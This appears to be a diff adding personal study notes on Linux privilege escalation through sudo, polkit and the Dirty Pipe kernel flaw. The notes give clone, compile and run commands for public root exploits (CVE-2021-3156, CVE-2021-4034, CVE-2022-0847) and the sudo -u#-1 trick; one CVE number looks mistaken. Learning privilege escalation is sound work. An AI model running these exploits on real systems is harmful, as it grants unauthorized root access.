@@ -1,0 +1,119 @@
+Section XXIII: Sudo
+		--> /etc/sudoers specifies which user or group are allowed to run specific
+program and with what privileges
+
+eg: sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
+
+One of the latest vulnerabilities for sudo: CVE-2021-3156 (https://github.com/blasty/CVE-2021-3156)
+
+1.8.31 -> Ubuntu 20.04
+1.8.27 -> Debian 10
+1.9.2 -> Fedira 33
+
+
+	--> sudo -V | head -n1 (look for sudo version)
+
+	--> cat /etc/lsb-release (look for OS version we use)
+
+when we run the poc of CVE-2021-3156
+
+cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
+cry0l1t3@nix02:~$ cd CVE-2021-3156
+cry0l1t3@nix02:~$ make
+
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+
+
+	WE DO ./sudo-hax-me-a-sadnwich 1 (where 1 is the version of the OS discovered before)
+
+Another version of vulnerabilities is CVE-2019-14827 found in version below 1.8.28
+
+POC:
+
+Sudo allows you to run commands as a specific user by using their user ID (UID). 
+You can find a user’s UID in the /etc/passwd file. For example:
+	
+	cat /etc/passwd | grep cry0l1t3
+
+=>	cry0l1t3:x:1005:1005:...
+
+This means the user cry0l1t3 has the UID 1005.
+
+
+Normally, you can run a command as a specific user using:
+
+		sudo -u#<UID> <command>
+
+However, there is a trick: if you use -1 as the UID, it gets interpreted as 0, 
+which is the UID of the root user. So this command:
+
+	sudo -u#-1 id
+
+runs as root and gives you root privileges:
+
+	uid=0(root)
+
+👉 In short: using -1 with sudo can map to UID 0, allowing you to execute commands as root.
+
+
+
+
+SECTION XXIV: Polkit
+
+	--> it is an authorization on linux OS that allows user software and systeme components
+to communicate with each other if the user software is authorized to do so.
+
+
+	--> To check if the user software is authorized for the instruction, polkit is 
+asked
+
+Polkit works with two groups of file;
+	- action/policies (/usr/share/polkit-1/actions)
+	- rules (/usr/share/polkit-1/rules.d)
+
+Additional permission for group and user could be set in
+	- 1/localauthority/50-local.d     with the .pkla extensions
+
+
+Additionals programs running:
+	- pkexec (=> runs a program with the rights of another user or with root rights)
+	- pkaction (=> can be used to display actions))
+	- pkcheck (=> can be used to check if a process is authorized for a specific person)
+
+
+Using pkexec
+	--> pkexec -u <user> <command>
+eg; pkexec -u root id
+
+
+--> Popular CVE-2021-4034
+
+cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
+cry0l1t3@nix02:~$ cd CVE-2021-4034
+cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
+
+
+
+SECTION XXV: Dirty Pipe => CVE-2022-0847
+
+	--> Linux kernel vulnerabilities allowing unhauthorized writing to root user
+files on linux
+
+
+POC:
+
+cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
+cry0l1t3@nix02:~$ bash compile.sh
+
+
+Kernel verification version: uname -r
+
+Exploitation: ./exploit-1
+
+
+
+
